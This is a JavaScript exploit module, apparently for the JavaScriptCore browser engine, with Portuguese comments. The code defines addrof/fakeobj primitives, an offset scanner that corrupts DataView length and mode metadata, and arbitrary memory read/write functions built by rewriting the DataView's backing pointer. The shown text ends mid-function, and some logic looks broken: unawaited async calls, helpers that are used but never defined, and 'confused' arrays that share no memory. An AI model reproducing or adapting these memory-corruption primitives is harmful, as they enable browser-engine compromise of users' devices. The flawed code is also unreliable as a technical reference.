// js/core_exploit.mjs (v31.15 - VERSÃO COM SCANNER PARA OFFSETS DO DATAVIEW OOB)

import { AdvancedInt64, PAUSE, toHex, log, setLogFunction, isAdvancedInt64Object } from './utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => {
    if (isAdvancedInt64Object(val)) {
        try {
            const strVal = val.toString(true);
            if (typeof strVal === 'string' && strVal !== 'undefined') {
                return strVal;
            }
        } catch (e) { /* ignora, usa fallback */ }
        return `AdvInt64(low:0x${val.low().toString(16)},high:0x${val.high().toString(16)})`;
    }
    if (typeof val === 'number') {
        return toHex(val, bits);
    }
    return String(val);
};

// OFFSETS OOB_DV_METADATA_BASE_IN_OOB_BUFFER e outros serão testados no runtime.
// Esses serão redefinidos dentro de triggerOOB_primitive_testable.

// --- NEW CORE ADDROF/FAKEOBJ PRIMITIVES ---
let _core_confused_array_main = null;
let _core_victim_array_main = null;

const CONFUSED_FLOAT64_ARRAY_INDEX = 0;
const FAKED_OBJECT_INDEX = 0;

function _int64ToDouble_core(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function _doubleToInt64_core(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

export function initCoreAddrofFakeobjPrimitives() {
    if (_core_confused_array_main && _core_victim_array_main) {
        log(`[CoreExploit] Primitivas addrof/fakeobj diretas já estão configuradas.`, "info", "initCoreAddrofFakeobjPrimitives");
        return;
    }
    _core_confused_array_main = new Float64Array([13.37]);
    _core_victim_array_main = [{ a: 1 }];

    log(`[CoreExploit] Primitivas addrof/fakeobj diretas inicializadas.`, "good", "initCoreAddrofFakeobjPrimitives");
}

export function addrof_core(obj) {
    const FNAME = 'CoreExploit.addrof_core';
    if (!_core_confused_array_main || !_core_victim_array_main) {
        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initCoreAddrofFakeobjPrimitives() primeiro.`, "critical", FNAME);
        throw new Error("Core addrof/fakeobj primitives not initialized.");
    }
    if (!(_core_confused_array_main instanceof Float64Array)) {
        log(`[${FNAME}] ERRO: _core_confused_array_main não é um Float64Array. Tipo: ${typeof _core_confused_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for addrof.");
    }
    if (!Array.isArray(_core_victim_array_main)) {
        log(`[${FNAME}] ERRO: _core_victim_array_main não é um Array. Tipo: ${typeof _core_victim_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for addrof.");
    }

    _core_victim_array_main[FAKED_OBJECT_INDEX] = obj;
    const tagged_addr = _doubleToInt64_core(_core_confused_array_main[CONFUSED_FLOAT64_ARRAY_INDEX]);
    log(`[${FNAME}] DEBUG: Endereço bruto (potencialmente tagged) lido: ${tagged_addr.toString(true)}`, "debug", FNAME);

    let untagged_addr = tagged_addr;
    const original_high = tagged_addr.high();
    const untagged_high = original_high & 0x0000FFFF;
    if (original_high !== untagged_high) {
        untagged_addr = new AdvancedInt64(tagged_addr.low(), untagged_high);
        log(`[${FNAME}] DEBUG: Endereço após untagging (high original: 0x${original_high.toString(16)} -> high untagged: 0x${untagged_high.toString(16)}): ${untagged_addr.toString(true)}`, "debug", FNAME);
    } else {
        log(`[${FNAME}] DEBUG: Nenhum untagging aplicado (high original 0x${original_high.toString(16)}).`, "debug", FNAME);
    }

    if (!isAdvancedInt64Object(untagged_addr) || untagged_addr.equals(AdvancedInt64.Zero) || untagged_addr.equals(AdvancedInt64.NaNValue)) {
        log(`[${FNAME}] FALHA: Endereço retornado para ${obj} (${untagged_addr ? untagged_addr.toString(true) : 'N/A'}) parece inválido ou nulo/NaN após untagging.`, "error", FNAME);
        throw new Error(`Failed to get address of ${obj}. Invalid address.`);
    }
    log(`[${FNAME}] SUCESSO: Endereço (final, untagged) retornado para objeto ${obj} (tipo: ${typeof obj}): ${untagged_addr.toString(true)}`, "debug", FNAME);
    return untagged_addr;
}

export function fakeobj_core(addr) {
    const FNAME = 'CoreExploit.fakeobj_core';
    if (!_core_confused_array_main || !_core_victim_array_main) {
        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initCoreAddrofFakeobjPrimitives() primeiro.`, "critical", FNAME);
        throw new Error("Core addrof/fakeobj primitives not initialized.");
    }
    if (!(_core_confused_array_main instanceof Float64Array)) {
        log(`[${FNAME}] ERRO: _core_confused_array_main não é um Float64Array. Tipo: ${typeof _core_confused_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for fakeobj.");
    }
    if (!Array.isArray(_core_victim_array_main)) {
        log(`[${FNAME}] ERRO: _core_victim_array_main não é um Array. Tipo: ${typeof _core_victim_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for fakeobj.");
    }

    if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
        log(`[${FNAME}] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido ou nulo/NaN.`, "error", FNAME);
        throw new Error(`Invalid address for fakeobj: ${addr.toString(true)}.`);
    }

    let tagged_addr = addr;
    const OBJECT_PTR_TAG_HIGH = 0x402a0000;
    if (addr.high() < 0x10000) { // Assume que endereços baixos precisam de tagging
        tagged_addr = new AdvancedInt64(addr.low(), addr.high() | OBJECT_PTR_TAG_HIGH);
        log(`[${FNAME}] DEBUG: Endereço após tagging (original: ${addr.toString(true)} -> tagged: ${tagged_addr.toString(true)})`, "debug", FNAME);
    } else {
        log(`[${FNAME}] DEBUG: Nenhum tagging aplicado ao high (0x${addr.high().toString(16)}). Assumindo que já está taggeado ou não precisa.`, "debug", FNAME);
    }

    _core_confused_array_main[CONFUSED_FLOAT64_ARRAY_INDEX] = _int64ToDouble_core(tagged_addr);
    const obj = _core_victim_array_main[FAKED_OBJECT_INDEX];

    if (obj === undefined || obj === null) {
        log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser ser um objeto inválido.`, "warn", FNAME);
    } else {
        try {
            const typeof_faked_obj = typeof obj;
            if (typeof_faked_obj === 'number' || typeof_faked_obj === 'boolean' || typeof_faked_obj === 'string') {
                 log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} não é um tipo de objeto (recebido: ${typeof_faked_obj}). Pode ser uma corrupção.`, "warn", FNAME);
            } else {
                 log(`[${FNAME}] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj} (typeof: ${typeof obj})`, "debug", FNAME);
            }
        } catch (e) {
            log(`[${FNAME}] ALERTA: Erro ao inspecionar objeto forjado para ${addr.toString(true)}: ${e.message}`, "warn", FNAME);
        }
    }
    return obj;
}
// --- END NEW CORE ADDROF/FAKEOBJ PRIMITIVES ---


// Existing utility functions
export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
    log(`[CoreExploit] Ambiente OOB limpo.`, "debug");
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

// OOB_DV_METADATA_BASE_IN_OOB_BUFFER e os offsets m_vector/m_length/m_mode
// serão testados e definidos por triggerOOB_primitive_testable
let current_OOB_DV_METADATA_BASE_IN_OOB_BUFFER = -1;
let current_OOB_DV_M_VECTOR_OFFSET = -1;
let current_OOB_DV_M_LENGTH_OFFSET = -1;
let current_OOB_DV_M_MODE_OFFSET = -1;

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    const TEST_RANGE_START = 0x50; // Começar a testar a base dos metadados um pouco antes
    const TEST_RANGE_END = 0x80; // Terminar um pouco depois
    const TEST_INCREMENT = 0x08; // De 8 em 8 bytes

    log(`[${FNAME_TRIGGER}] Iniciando scanner para OOB DataView Metadatos...`, 'test', FNAME_TRIGGER);

    for (let base_offset = TEST_RANGE_START; base_offset <= TEST_RANGE_END; base_offset += TEST_INCREMENT) {
        log(`[${FNAME_TRIGGER}] Testando OOB_DV_METADATA_BASE_IN_OOB_BUFFER = ${toHex(base_offset)}`, 'info', FNAME_TRIGGER);

        // Define os offsets para esta tentativa
        current_OOB_DV_METADATA_BASE_IN_OOB_BUFFER = base_offset;
        current_OOB_DV_M_VECTOR_OFFSET = current_OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        current_OOB_DV_M_LENGTH_OFFSET = current_OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        current_OOB_DV_M_MODE_OFFSET = current_OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

        try {
            // Lógica de inicialização original, mas usando os `current_` offsets.
            if (isOOBEnvironmentSetup && !options.force_reinit) { // Apenas re-inicializa se a força ou inconsistência
                 // ... Ignora a lógica de verificação de estado aqui, pois ela será tratada por selfTestOOBReadWrite
                 // e o objetivo é re-inicializar a cada tentativa de offset.
            }

            log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
            const currentAllocSize = getOOBAllocationSize();
            log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });

            oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
            oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);

            if (oob_dataview_real.buffer !== oob_array_buffer_real) {
                const errorMsg = `[${FNAME_TRIGGER}] ERRO CRÍTICO: DataView não está associado ao ArrayBuffer real após criação!`;
                log(errorMsg, 'critical', FNAME_TRIGGER);
                throw new Error(errorMsg);
            }

            if (currentAllocSize > current_OOB_DV_M_LENGTH_OFFSET + 3) {
                oob_dataview_real.setUint32(current_OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
                log(`    m_length do oob_dataview_real expandido para 0xFFFFFFFF no offset ${toHex(current_OOB_DV_M_LENGTH_OFFSET)}.`, 'info', FNAME_TRIGGER);
            } else {
                const errorMsg = `Falha ao expandir m_length: currentAllocSize (${currentAllocSize}) é muito pequeno para o offset ${toHex(current_OOB_DV_M_LENGTH_OFFSET)}.`;
                log(errorMsg, 'critical', FNAME_TRIGGER);
                throw new Error(errorMsg);
            }

            const OOB_DATA_VIEW_MODE = JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0];
            if (currentAllocSize > current_OOB_DV_M_MODE_OFFSET + 3) {
                oob_dataview_real.setUint32(current_OOB_DV_M_MODE_OFFSET, OOB_DATA_VIEW_MODE, true);
                log(`    m_mode do oob_dataview_real configurado para ${toHex(OOB_DATA_VIEW_MODE)} no offset ${toHex(current_OOB_DV_M_MODE_OFFSET)}.`, 'info', FNAME_TRIGGER);
            } else {
                const errorMsg = `Falha ao configurar m_mode: currentAllocSize (${currentAllocSize}) é muito pequeno para o offset ${toHex(current_OOB_DV_M_MODE_OFFSET)}.`;
                log(errorMsg, 'critical', FNAME_TRIGGER);
                throw new Error(errorMsg);
            }

            log(`[${FNAME_TRIGGER}] Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
            log(`    oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
            log(`    oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${toHex(oob_dataview_real.getUint32(current_OOB_DV_M_LENGTH_OFFSET, true))}, mode=${toHex(oob_dataview_real.getUint32(current_OOB_DV_M_MODE_OFFSET, true))} (m_length/m_mode expandidos)`, 'info', FNAME_TRIGGER);
            isOOBEnvironmentSetup = true;
            log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);

            // Tentar um auto-teste específico para este offset (fora de selfTestOOBReadWrite)
            // Lendo um valor conhecido e escrevendo-o de volta
            const TEST_OFFSET_FOR_OOB = current_OOB_DV_M_VECTOR_OFFSET + 0x10; // Um offset seguro após os metadados
            const TEST_VALUE_FOR_OOB = new AdvancedInt64(0xDEADC0DE, 0xCAFEBABE);
            if (currentAllocSize > TEST_OFFSET_FOR_OOB + 8) {
                oob_write_absolute(TEST_OFFSET_FOR_OOB, TEST_VALUE_FOR_OOB, 8);
                const read_back_test_value = oob_read_absolute(TEST_OFFSET_FOR_OOB, 8);
                if (read_back_test_value.equals(TEST_VALUE_FOR_OOB)) {
                    log(`[${FNAME_TRIGGER}] SUCESSO na leitura/escrita OOB local para base ${toHex(base_offset)}!`, 'good', FNAME_TRIGGER);
                    return true; // Este offset funciona!
                } else {
                    log(`[${FNAME_TRIGGER}] FALHA na leitura/escrita OOB local para base ${toHex(base_offset)}: Lido ${toHexHelper(read_back_test_value)}, Esperado ${toHexHelper(TEST_VALUE_FOR_OOB)}.`, 'error', FNAME_TRIGGER);
                }
            } else {
                log(`[${FNAME_TRIGGER}] ALERTA: Não foi possível testar L/E OOB local, buffer muito pequeno para offset de teste.`, 'warn', FNAME_TRIGGER);
            }

        } catch (e) {
            log(`ERRO em ${FNAME_TRIGGER} para offset ${toHex(base_offset)}: ${e.message}`, 'critical', FNAME_TRIGGER);
        } finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }
    log(`[${FNAME_TRIGGER}] FALHA CRÍTICA: Nenhuma base de metadados OOB do DataView funcionou na faixa ${toHex(TEST_RANGE_START)}-${toHex(TEST_RANGE_END)}.`, 'critical', FNAME_TRIGGER);
    throw new Error("Nenhuma base de metadados OOB DataView funcional encontrada.");
}

export function isOOBReady() {
    let mLengthExpanded = false;
    let mModeConfigured = false;
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) {
        try {
            if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
                log(`[isOOBReady] DataView de OOB está detached/corrompido.`, "error");
                isOOBEnvironmentSetup = false;
                return false;
            }
            // Use current_OOB_DV_M_LENGTH_OFFSET e current_OOB_DV_M_MODE_OFFSET para verificar.
            if (oob_array_buffer_real.byteLength > current_OOB_DV_M_LENGTH_OFFSET + 3) {
                mLengthExpanded = (oob_dataview_real.getUint32(current_OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF);
            }
            if (oob_array_buffer_real.byteLength > current_OOB_DV_M_MODE_OFFSET + 3) {
                const EXPECTED_OOB_MODE = JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0];
                mModeConfigured = (oob_dataview_real.getUint32(current_OOB_DV_M_MODE_OFFSET, true) === EXPECTED_OOB_MODE);
            }

        } catch (e) {
            log(`[isOOBReady] Erro durante verificação de mLengthExpanded/mModeConfigured: ${e.message}`, "error");
            mLengthExpanded = false;
            mModeConfigured = false;
            isOOBEnvironmentSetup = false;
        }
    }
    return isOOBEnvironmentSetup &&
        oob_array_buffer_real instanceof ArrayBuffer &&
        oob_dataview_real instanceof DataView &&
        oob_array_buffer_real.byteLength > 0 &&
        oob_dataview_real.buffer === oob_array_buffer_real &&
        mLengthExpanded &&
        mModeConfigured;
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) {
    const FNAME_RESET = `${fname_parent_for_log}._explicit_dv_reset`;
    try {
        if (isOOBReady()) {
            // Usa os offsets CORRIGIDOS para a restauração.
            const temp_val_vec = oob_read_absolute(current_OOB_DV_M_VECTOR_OFFSET, 8);
            const temp_val_len = oob_read_absolute(current_OOB_DV_M_LENGTH_OFFSET, 4);
            const temp_val_mode = oob_read_absolute(current_OOB_DV_M_MODE_OFFSET, 4);

            oob_write_absolute(current_OOB_DV_M_VECTOR_OFFSET, temp_val_vec, 8);
            oob_write_absolute(current_OOB_DV_M_LENGTH_OFFSET, temp_val_len, 4);
            oob_write_absolute(current_OOB_DV_M_MODE_OFFSET, temp_val_mode, 4);
            log(`    [${FNAME_RESET}] DV reset explícito bem-sucedido.`, 'debug');
        } else {
            log(`    [${FNAME_RESET}] ALERTA: Não foi possível realizar reset explícito do DV, ambiente OOB não está pronto.`, 'warn');
        }
    } catch (e) {
        log(`    [${FNAME_RESET}] ERRO durante o reset explícito do DV: ${e.message}`, 'error');
        isOOBEnvironmentSetup = false;
    }
}

export async function arb_read(absolute_address, byteLength) {
    const FNAME = 'CoreExploit.arb_read (v31.15)';
    if (!isOOBReady()) {
        log(`[${FNAME}] Ambiente OOB não está pronto para leitura arbitrária. Tentando re-inicializar...`, 'warn');
        await triggerOOB_primitive({ force_reinit: true }); // Isso chamará o scanner novamente
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para leitura arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para arb_read deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
        if (!isAdvancedInt64Object(addr64)) {
            throw new TypeError(`Endereço convertido para arb_read não é AdvancedInt64 válido.`);
        }
    }

    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
    let result_val = null;
    try {
        log(`[${FNAME}] DEBUG: Realizando snapshots de metadados do DataView antes da manipulação.`, 'debug');
        m_vector_orig_snap = oob_read_absolute(current_OOB_DV_M_VECTOR_OFFSET, 8);
        m_length_orig_snap = oob_read_absolute(current_OOB_DV_M_LENGTH_OFFSET, 4);
        m_mode_orig_snap = oob_read_absolute(current_OOB_DV_M_MODE_OFFSET, 4);
        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS: m_vector=${toHexHelper(m_vector_orig_snap)}, m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, 'debug');


        if (!isAdvancedInt64Object(m_vector_orig_snap)) {
            log(`[${FNAME}] ALERTA CRÍTICO: m_vector_orig_snap NÃO é AdvancedInt64 após leitura (verif. local). Tipo: ${typeof m_vector_orig_snap}. Construtor: ${m_vector_orig_snap?.constructor?.name}. Valor: ${toHexHelper(m_vector_orig_snap)}. A restauração falhará.`, 'critical');
            isOOBEnvironmentSetup = false;
            throw new Error("Falha ao ler m_vector original como AdvancedInt64 em arb_read (verif. local).");
        }

        log(`[${FNAME}] DEBUG: Escrevendo NOVO m_vector (${toHexHelper(addr64)}) e m_length (0xFFFFFFFF) para permitir leitura arbitrária.`, 'debug');
        oob_write_absolute(current_OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        oob_write_absolute(current_OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
        // Não mude o m_mode aqui, ele deve ter sido configurado corretamente no triggerOOB_primitive.
        log(`[${FNAME}] DEBUG: Valores do DataView APÓS MANIPULAÇÃO: m_vector=${toHexHelper(oob_read_absolute(current_OOB_DV_M_VECTOR_OFFSET, 8))}, m_length=${toHex(oob_read_absolute(current_OOB_DV_M_LENGTH_OFFSET, 4))}.`, 'debug');


        log(`[${FNAME}] DEBUG: Realizando leitura arbitrária de ${addr64.toString(true)} (byteLength: ${byteLength}).`, 'debug');
        switch (byteLength) {
            case 1: result_val = oob_dataview_real.getUint8(0); break;
            case 2: result_val = oob_dataview_real.getUint16(0, true); break;
            case 4: result_val = oob_dataview_real.getUint32(0, true); break;
            case 8: {
                const low = oob_dataview_real.getUint32(0, true);
                const high = oob_dataview_real.getUint32(4, true);
                result_val = new AdvancedInt64(low, high);
                break;
            }
            default: throw new Error(`Invalid byteLength for arb_read: ${byteLength}`);
        }
        log(`[${FNAME}] DEBUG: Leitura arbitrária concluída. Resultado: ${toHexHelper(result_val, byteLength * 8)}.`, 'debug');
        return result_val;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME} ao ler de ${addr64.toString(true)} (byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
        isOOBEnvironmentSetup = false;
        throw e;
    } finally {
        // Restauração dos metadados originais.
        if (isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) {
            log(`[${FNAME}] DEBUG: Restaurando metadados originais do DataView.`, 'debug');
            try {
                oob_write_absolute(current_OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
                oob_write_absolute(current_OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
                oob_write_absolute(current_OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME);
                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, 'debug');
            } catch (e_restore) {
                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${e_restore.message}. Ambiente agora INSEGURo.`, 'critical');
                isOOBEnvironmentSetup = false;
            }
        } else if (isOOBReady()) {
            log(`[${FNAME}] ALERTA: Não pôde restaurar metadados porque m_vector_orig_snap não era AdvancedInt64 ou outras variáveis de snapshot estavam inválidas. Ambiente instável.`, 'critical');
            isOOBEnvironmentSetup = false;
        } else {
            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, 'critical');
        }
    }
}

export async function arb_write(absolute_address, value, byteLength) {
    const FNAME = 'CoreExploit.arb_write (v31.15)';
    if (!isOOBReady()) {
        log(`[${FNAME}] Ambiente OOB não está pronto para escrita arbitrária. Tentando re-inicializar...`, 'warn');
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para escrita arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para arb_write deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
        if (!isAdvancedInt64Object(addr64)) {
            throw new TypeError(`Endereço convertido para arb_write não é AdvancedInt64 válido.`);
        }
    }

    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
    try {
        log(`[${FNAME}] DEBUG: Realizando snapshots de metadados do DataView antes da manipulação para escrita.`, 'debug');
        m_vector_orig_snap = oob_read_absolute(current_OOB_DV_M_VECTOR_OFFSET, 8);
        m_length_orig_snap = oob_read_absolute(current_OOB_DV_M_LENGTH_OFFSET, 4);
        m_mode_orig_snap = oob_read_absolute(current_OOB_DV_M_MODE_OFFSET, 4);
        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS: m_vector=${toHexHelper(m_vector_orig_snap)}, m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, 'debug');


        if (!isAdvancedInt64Object(m_vector_orig_snap)) {
            log(`[${FNAME}] ALERTA CRÍTICO: m_vector_orig_snap NÃO é AdvancedInt64 após leitura (verif. local). Tipo: ${typeof m_vector_orig_snap}. Construtor: ${m_vector_orig_snap?.constructor?.name}. Valor: ${toHexHelper(m_vector_orig_snap)}. A restauração falhará.`, 'critical');
            isOOBEnvironmentSetup = false;
            throw new Error("Falha ao ler m_vector original como AdvancedInt64 em arb_write (verif. local).");
        }

        log(`[${FNAME}] DEBUG: Escrevendo NOVO m_vector (${toHexHelper(addr64)}) e m_length (0xFFFFFFFF) para permitir escrita arbitrária.`, 'debug');
        oob_write_absolute(current_OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        oob_write_absolute(current_OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
        log(`[${FNAME}] DEBUG: Valores do DataView APÓS MANIPULAÇÃO: m_vector=${toHexHelper(oob_read_absolute(current_OOB_DV_M_VECTOR_OFFSET, 8))}, m_length=${toHex(oob_read_absolute(current_OOB_DV_M_LENGTH_OFFSET, 4))}.`, 'debug');


        log(`[${FNAME}] DEBUG: Realizando escrita arbitrária em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}).`, 'debug');
        let val64_write;
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
            case 8:
                val64_write = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                if (!isAdvancedInt64Object(val64_write)) {
                    throw new TypeError("Valor para escrita de 8 bytes não é AdvancedInt64 válido após conversão.");
                }
                oob_dataview_real.setUint32(0, val64_write.low(), true);
                oob_dataview_real.setUint32(4, val64_write.high(), true);
                break;
            default: throw new Error("Invalid byteLength para arb_write");
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME} ao escrever em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
        isOOBEnvironmentSetup = false;
        throw e;
    } finally {
        if (isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) {
            log(`[${FNAME}] DEBUG: Restaurando metadados originais do DataView após escrita.`, 'debug');
            try {
                oob_write_absolute(current_OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
                oob_write_absolute(current_OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
                oob_write_absolute(current_OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME);
                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, 'debug');
            } catch (eR) {
                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${eR.message}. Ambiente agora INSEGURo.`, 'critical');
                isOOBEnvironmentSetup = false;
            }
        } else if (isOOBReady()) {
            log(`[${FNAME}] ALERTA: Não pôde restaurar metadados porque m_vector_orig_snap não era AdvancedInt64 ou outras variáveis de snapshot estavam inválidas. Ambiente instável.`, 'critical');
            isOOBEnvironmentSetup = false;
        } else {
            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, 'critical');
        }
    }
}


export function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (v31.15 - com re-inicialização forçada e validação de m_mode, e Scanner de Offsets) ---`, 'test', FNAME_TEST);
    let success32 = false;
    let success64 = false;

    // A triggerOOB_primitive agora incorpora o scanner de offsets e retorna true se encontrar um funcionando.
    // Então, chamamos triggerOOB_primitive aqui diretamente.
    try {
        currentLog(`    (Setup) Chamando triggerOOB_primitive (que agora escaneia offsets)...`, 'info', FNAME_TEST);
        const setupSuccess = triggerOOB_primitive({ force_reinit: true });
        if (!setupSuccess) {
            currentLog(`    (Setup) FALHA CRÍTICA: Ambiente OOB não pôde ser inicializado (nenhum offset OOB funcionou).`, 'critical', FNAME_TEST);
            return false;
        }
        currentLog(`    (Setup) Ambiente OOB pronto para teste (Base de metadados OOB: ${toHex(current_OOB_DV_METADATA_BASE_IN_OOB_BUFFER)}).`, 'good', FNAME_TEST);

        // O resto do self-test é o mesmo, mas usando os offsets _current_
        const test_offset = current_OOB_DV_METADATA_BASE_IN_OOB_BUFFER + 0x10; // Testar um pouco após os metadados
        if (test_offset + 8 > oob_array_buffer_real.byteLength) {
             currentLog(`    (Setup) ERRO: Offset de teste (${toHex(test_offset)}) está fora dos limites do oob_array_buffer_real (${oob_array_buffer_real.byteLength}).`, 'critical', FNAME_TEST);
             throw new Error("Offset de teste fora dos limites.");
        }

        const test_val32 = 0x11223344;
        currentLog(`    (32bit Test) Escrevendo ${toHex(test_val32)} em offset absoluto ${toHex(test_offset)} do oob_array_buffer_real`, 'debug', FNAME_TEST);
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        currentLog(`    (32bit Test) Lido ${toHex(read_val32)} de offset absoluto ${toHex(test_offset)}`, "debug", FNAME_TEST);

        if (read_val32 === test_val32) {
            currentLog(`    (32bit Test) SUCESSO: Lido ${toHex(read_val32)} corretamente.`, "good", FNAME_TEST);
            success32 = true;
        } else {
            currentLog(`    (32bit Test) FALHA: Lido ${toHex(read_val32)}, esperado ${toHex(test_val32)}.`, "error", FNAME_TEST);
        }

        const next_offset = test_offset + 16;
        if (next_offset + 8 > oob_array_buffer_real.byteLength) {
            currentLog(`    (64bit Test) ERRO: Offset ${toHex(next_offset)} fora dos limites do buffer (${oob_array_buffer_real.byteLength})`, "critical", FNAME_TEST);
            throw new Error("Offset para teste 64bit fora dos limites");
        }
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        currentLog(`    (64bit Test) Escrevendo (test_val64): ${toHexHelper(test_val64)} em offset absoluto ${toHex(next_offset)}`, 'debug', FNAME_TEST);
